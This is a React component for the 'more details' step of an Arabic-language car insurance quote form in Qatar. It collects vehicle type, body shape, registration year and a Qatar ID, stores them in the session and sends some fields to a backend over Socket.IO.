import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import FlowHeader from '../components/FlowHeader';
import ProgressBar from '../components/ProgressBar';
import { useSocket } from '../context/SocketContext';
import '../index.css';

const MoreDetails = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { socket, userIp } = useSocket();
  
  // Get car details from previous page
  const carDetails = location.state?.carDetails || {
    make: 'Toyota',
    model: 'Camry',
    year: '2016',
    seats: '5',
    cylinders: '4'
  };

  const [formData, setFormData] = useState({
    vehicleType: '1001',
    vehicleShape: '104',
    firstRegDate: carDetails.year || '',
    qatarId: '',
    promocode: ''
  });

  const [showPromocode, setShowPromocode] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({});

  // Vehicle types options
  const vehicleTypes = [
    { value: '1001', label: 'سيارة خاصة' },
    { value: '1002', label: 'سيارة أجرة' },
    { value: '1003', label: 'سيارة نقل' },
    { value: '1004', label: 'حافلة' }
  ];

  // Vehicle shapes options
  const vehicleShapes = [
    { value: '104', label: 'صـالـون' },
    { value: '105', label: 'دفع رباعي' },
    { value: '106', label: 'شاحنة' },
    { value: '107', label: 'ميني فان' },
    { value: '108', label: 'كوبيه' }
  ];

  // Generate years from 1990 to current year
  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: currentYear - 1989 }, (_, i) => currentYear - i);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
    
    // Clear error when user types
    if (errors[name]) {
      setErrors(prev => ({
        ...prev,
        [name]: ''
      }));
    }
  };

  const validateQatarId = (id) => {
    // Qatar ID validation: 11 digits or company registration number
    if (!id) return false;
    return id.length >= 8 && /^\d+$/.test(id);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    // Validate Qatar ID
    if (!validateQatarId(formData.qatarId)) {
      setErrors({ qatarId: 'الرجاء إدخال رقم بطاقة قطرية صحيح' });
      return;
    }

    setIsLoading(true);

    try {
      // Get plate number from sessionStorage
      const plateNumber = sessionStorage.getItem('plateNumber') || '';
      
      // Store all data in sessionStorage
      const completeData = {
        ...carDetails,
        ...formData,
        plateNumber,
        timestamp: new Date().toISOString()
      };
      
      sessionStorage.setItem('car-insurance-data', JSON.stringify(completeData));
      
      // Send to backend via Socket.IO
      if (socket && userIp) {
        socket.emit('submitMoreDetails', {
          ip: userIp,
          bodyType: formData.vehicleShape,
          engineSize: formData.vehicleType,
          color: 'N/A',
          registrationYear: formData.firstRegDate,
          plateNumber: plateNumber
        });
      }
      
      // Navigate to quote results page
      setTimeout(() => {
        navigate('/quote', { state: { data: completeData } });
      }, 500);
      
    } catch (error) {
      console.error('Error submitting form:', error);
      setErrors({ submit: 'حدث خطأ، الرجاء المحاولة مرة أخرى' });
    } finally {
      setIsLoading(false);
    }
  };

  const handleBack = () => {
    navigate(-1);
  };

  const handleEdit = () => {
    navigate('/car-details', { state: { editMode: true, carDetails } });
  };

  const togglePromocode = () => {
    setShowPromocode(!showPromocode);
  };

  return (
    <div className="flow rtl">
      <div className="flow__top">
        <FlowHeader onBackClick={handleBack} />
        <ProgressBar currentStep={2} totalSteps={4} />

        {/* Content */}
        <div className="flow__content">
          <h1>الرجاء تعبئة البيانات المطلوبة</h1>
          
          <div className="more-details">
            {/* Car Details Summary */}
            <div className="details-car">
              <svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg" className="details-car__icon">
                <path d="M37.7147 17.9997L35.5704 12.5197C35.2453 11.6891 34.4446 11.1426 33.5527 11.1426H14.4482C13.5563 11.1426 12.7555 11.6891 12.4305 12.5197L10.2861 17.9997" stroke="#1C1C1C" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                <path d="M42.6678 26.0396L41.8486 26.6131L42.6678 26.0396ZM41.8637 24.8908L41.0444 25.4643L41.8637 24.8908ZM12.6132 22.1487L11.794 22.7221L12.6132 22.1487ZM3.8091 27.6963V32.2539H5.8091V27.6963H3.8091ZM5.31627 24.3173L4.51209 25.4662L6.15056 26.6131L6.95474 25.4643L5.31627 24.3173ZM4.19006 23.1428H4.70474V21.1428H4.19006V23.1428ZM7.63832 16.1904H4.19006V18.1904H7.63832V16.1904ZM13.4324 21.5752L10.8242 17.8492L9.18576 18.9961L11.794 22.7221L13.4324 21.5752ZM22.1424 22.3809H14.9799V24.3809H22.1424V22.3809ZM22.1424 24.3809H25.8567V22.3809H22.1424V24.3809ZM25.8567 24.3809H33.0193V22.3809H25.8567V24.3809ZM36.2052 22.7221L38.8134 18.9961L37.1749 17.8492L34.5667 21.5752L36.2052 22.7221ZM40.3608 18.1904H43.8091V16.1904H40.3608V18.1904ZM43.8091 21.1428H43.2944V23.1428H43.8091V21.1428ZM41.0444 25.4643L41.8486 26.6131L43.4871 25.4662L42.6829 24.3173L41.0444 25.4643ZM42.1901 27.6963V32.2539H44.1901V27.6963H42.1901ZM40.3012 34.1428H25.8567V36.1428H40.3012V34.1428ZM25.8567 34.1428H22.1424V36.1428H25.8567V34.1428ZM7.69799 36.1428H22.1424V34.1428H7.69799V36.1428ZM42.1901 32.2539C42.1901 33.2971 41.3444 34.1428 40.3012 34.1428V36.1428C42.4489 36.1428 44.1901 34.4017 44.1901 32.2539H42.1901ZM41.8486 26.6131C42.0709 26.9306 42.1901 27.3088 42.1901 27.6963H44.1901C44.1901 26.8984 43.9446 26.1198 43.4871 25.4662L41.8486 26.6131ZM41.3524 21.9472C40.41 22.8896 40.2802 24.3725 41.0444 25.4643L42.6829 24.3173C42.4752 24.0206 42.5105 23.6176 42.7666 23.3614L41.3524 21.9472ZM43.2944 21.1428C42.566 21.1428 41.8674 21.4322 41.3524 21.9472L42.7666 23.3614C42.9066 23.2215 43.0964 23.1428 43.2944 23.1428V21.1428ZM45.2853 19.6666C45.2853 20.4819 44.6244 21.1428 43.8091 21.1428V23.1428C45.729 23.1428 47.2853 21.5865 47.2853 19.6666H45.2853ZM33.0193 24.3809C34.2883 24.3809 35.4775 23.7618 36.2052 22.7221L34.5667 21.5752C34.2132 22.0802 33.6356 22.3809 33.0193 22.3809V24.3809ZM11.794 22.7221C12.5217 23.7618 13.7109 24.3809 14.9799 24.3809V22.3809C14.3635 22.3809 13.7859 22.0802 13.4324 21.5752L11.794 22.7221ZM7.63832 18.1904C8.25469 18.1904 8.83229 18.4912 9.18576 18.9961L10.8242 17.8492C10.0965 16.8096 8.90732 16.1904 7.63832 16.1904V18.1904ZM2.71387 19.6666C2.71387 18.8513 3.37478 18.1904 4.19006 18.1904V16.1904C2.27021 16.1904 0.713867 17.7468 0.713867 19.6666H2.71387ZM4.19006 21.1428C3.37478 21.1428 2.71387 20.4819 2.71387 19.6666H0.713867C0.713867 21.5865 2.27021 23.1428 4.19006 23.1428V21.1428ZM6.64679 21.9472C6.13173 21.4322 5.43315 21.1428 4.70474 21.1428V23.1428C4.90272 23.1428 5.09258 23.2215 5.23257 23.3614L6.64679 21.9472ZM6.95474 25.4643C7.71899 24.3725 7.58915 22.8896 6.64679 21.9472L5.23257 23.3614C5.4887 23.6176 5.52399 24.0206 5.31627 24.3173L6.95474 25.4643ZM43.8091 18.1904C44.6244 18.1904 45.2853 18.8513 45.2853 19.6666H47.2853C47.2853 17.7468 45.729 16.1904 43.8091 16.1904V18.1904ZM3.8091 32.2539C3.8091 34.4017 5.55022 36.1428 7.69799 36.1428V34.1428C6.65479 34.1428 5.8091 33.2971 5.8091 32.2539H3.8091ZM38.8134 18.9961C39.1669 18.4912 39.7445 18.1904 40.3608 18.1904V16.1904C39.0918 16.1904 37.9027 16.8096 37.1749 17.8492L38.8134 18.9961ZM5.8091 27.6963C5.8091 27.3088 5.92831 26.9306 6.15056 26.6131L4.51209 25.4662C4.05453 26.1198 3.8091 26.8984 3.8091 27.6963H5.8091Z" fill="#1C1C1C"/>
                <path d="M32.0475 31.4287H16.5713" stroke="#1C1C1C" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                <path d="M33.9043 35.7616V38.8569C33.9043 40.0535 34.8743 41.0235 36.071 41.0235H39.4757C40.6723 41.0235 41.6424 40.0535 41.6424 38.8569V35.1426" stroke="#1C1C1C" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                <path d="M7.28613 35.7616V38.8569C7.28613 40.0535 8.25618 41.0235 9.4528 41.0235H12.8576C14.0542 41.0235 15.0242 40.0535 15.0242 38.8569V35.1426" stroke="#1C1C1C" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
              
              <div className="details-car__content">
                <div className="details-car__content-title">
                  {carDetails.make} - {carDetails.model}, {carDetails.year}
                </div>
                <div className="details-car__content-desc details-car__content-desc-row">
                  <span>الأسطوانات {carDetails.cylinders}</span>
                  <span>المقاعد {carDetails.seats}</span>
                </div>
              </div>
              
              <div className="details-car__action-button" onClick={handleEdit} style={{ cursor: 'pointer' }}>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path fillRule="evenodd" clipRule="evenodd" d="M15.2929 2.29289C15.6834 1.90237 16.3166 1.90237 16.7071 2.29289L21.7071 7.29289C22.0976 7.68342 22.0976 8.31658 21.7071 8.70711L8.70711 21.7071C8.51957 21.8946 8.26522 22 8 22H3C2.44772 22 2 21.5523 2 21V16C2 15.7348 2.10536 15.4804 2.29289 15.2929L15.2929 2.29289ZM4 16.4142V20H7.58579L19.5858 8L16 4.41421L4 16.4142Z" fill="#526C82" fillOpacity="0.8"/>
                </svg>
              </div>
            </div>

            {/* Form Fields */}
            <form onSubmit={handleSubmit} className="more-details__fields">
              {/* Vehicle Type Select */}
              <div className="base-select-wrapper">
                <label className="base-select-label">نوع السيارة</label>
                <select
                  name="vehicleType"
                  value={formData.vehicleType}
                  onChange={handleChange}
                  className="base-select-control"
                  required
                >
                  {vehicleTypes.map(type => (
                    <option key={type.value} value={type.value}>
                      {type.label}
                    </option>
                  ))}
                </select>
              </div>

              {/* Vehicle Shape Select */}
              <div className="base-select-wrapper">
                <label className="base-select-label">شكل السيارة</label>
                <select
                  name="vehicleShape"
                  value={formData.vehicleShape}
                  onChange={handleChange}
                  className="base-select-control"
                  required
                >
                  {vehicleShapes.map(shape => (
                    <option key={shape.value} value={shape.value}>
                      {shape.label}
                    </option>
                  ))}
                </select>
                <div className="question-button" title="شكل السيارة يحدد نوع الهيكل">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="12" cy="12" r="9" stroke="#526C82" strokeOpacity="0.4" strokeWidth="2"/>
                    <path d="M8.61621 9.66411C8.61621 10.0561 8.98021 10.5181 9.51221 10.5181C10.1562 10.5181 10.3242 10.0001 10.4082 9.74811C10.6182 9.11811 10.9122 8.26411 12.1162 8.26411C13.0402 8.26411 13.5722 8.90811 13.5722 9.55211C13.5722 10.0421 13.2642 10.3921 12.6062 10.9661C11.7242 11.7361 11.0382 12.3381 11.0382 13.5001C11.0382 13.5981 11.0382 13.8921 11.1502 14.1021C11.2622 14.2981 11.5562 14.4941 11.8782 14.4941C12.5502 14.4941 12.6482 13.9761 12.6902 13.7801C12.8302 13.0941 12.8722 12.9261 13.4882 12.3801C14.9302 11.0641 15.4342 10.6161 15.4342 9.52411C15.4342 8.09611 14.1882 6.80811 12.1442 6.80811C9.28821 6.80811 8.61621 9.02011 8.61621 9.66411ZM12.9702 16.1321C12.9702 15.5721 12.5082 15.1101 11.9342 15.1101C11.3742 15.1101 10.9122 15.5721 10.9122 16.1321C10.9122 16.7061 11.3742 17.1681 11.9342 17.1681C12.5082 17.1681 12.9702 16.7061 12.9702 16.1321Z" fill="#AAB4BD"/>
                  </svg>
                </div>
              </div>

              {/* First Registration Date */}
              <div className="base-select-wrapper">
                <label className="base-select-label">تاريخ تسجيل السيارة</label>
                <select
                  name="firstRegDate"
                  value={formData.firstRegDate}
                  onChange={handleChange}
                  className="base-select-control"
                  required
                >
                  <option value="">اختر السنة</option>
                  {years.map(year => (
                    <option key={year} value={year}>
                      {year}
                    </option>
                  ))}
                </select>
              </div>

              {/* Qatar ID Input */}
              <div className="input-container">
                <div className="input-wrapper">
                  <input
                    className={`input input_rtl ${errors.qatarId ? 'input_error' : ''}`}
                    type="text"
                    inputMode="numeric"
                    placeholder=" "
                    name="qatarId"
                    value={formData.qatarId}
                    onChange={handleChange}
                    maxLength="15"
                    required
                  />
                  <label className="label">رقم البطاقة القطرية أو رقم الشركة</label>
                  {errors.qatarId && (
                    <span className="input-error-message">{errors.qatarId}</span>
                  )}
                </div>
              </div>

              {/* Promocode Section */}
              <div className="promocode-input more-details__promocode">
                <div className="promocode-input__header" onClick={togglePromocode} style={{ cursor: 'pointer' }}>
                  <div className="promocode-input__title">
                    <i className="promocode-input__icon">
                      <svg 
                        width="20" 
                        height="20" 
                        viewBox="0 0 20 20" 
                        fill="none" 
                        xmlns="http://www.w3.org/2000/svg"
                        style={{ transform: showPromocode ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.3s' }}
                      >
                        <path fillRule="evenodd" clipRule="evenodd" d="M3.29289 6.29289C3.68342 5.90237 4.31658 5.90237 4.70711 6.29289L10 11.5858L15.2929 6.29289C15.6834 5.90237 16.3166 5.90237 16.7071 6.29289C17.0976 6.68342 17.0976 7.31658 16.7071 7.70711L10.7071 13.7071C10.3166 14.0976 9.68342 14.0976 9.29289 13.7071L3.29289 7.70711C2.90237 7.31658 2.90237 6.68342 3.29289 6.29289Z" fill="#526C82" fillOpacity="0.8"/>
                      </svg>
                    </i>
                    <span>استخدم رمز ترويجي</span>
                  </div>
                </div>
                
                {showPromocode && (
                  <div className="promocode-input__content" style={{ marginTop: '16px' }}>
                    <div className="input-container">
                      <div className="input-wrapper">
                        <input
                          className="input input_rtl"
                          type="text"
                          placeholder=" "
                          name="promocode"
                          value={formData.promocode}
                          onChange={handleChange}
                          maxLength="20"
                        />
                        <label className="label">أدخل الرمز الترويجي</label>
                      </div>
                    </div>
                  </div>
                )}
              </div>

              {/* Submit Button */}
              <button 
                className="btn btn--medium more-details__button" 
                type="submit"
                disabled={isLoading}
              >
                {isLoading ? 'جاري المعالجة...' : 'متابعة'}
                <svg width="24" height="25" viewBox="0 0 24 25" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path className="next-icon" fillRule="evenodd" clipRule="evenodd" d="M12.7071 4.79289C12.3166 4.40237 11.6834 4.40237 11.2929 4.79289C10.9024 5.18342 10.9024 5.81658 11.2929 6.20711L16.5858 11.5H5C4.44772 11.5 4 11.9477 4 12.5C4 13.0523 4.44772 13.5 5 13.5H16.5858L11.2929 18.7929C10.9024 19.1834 10.9024 19.8166 11.2929 20.2071C11.6834 20.5976 12.3166 20.5976 12.7071 20.2071L19.7071 13.2071C20.0976 12.8166 20.0976 12.1834 19.7071 11.7929L12.7071 4.79289Z" fill="#FFF"/>
                </svg>
              </button>

              {errors.submit && (
                <div className="error-message" style={{ color: 'red', textAlign: 'center', marginTop: '16px' }}>
                  {errors.submit}
                </div>
              )}
            </form>
          </div>
        </div>
      </div>

    </div>
  );
};

export default MoreDetails;
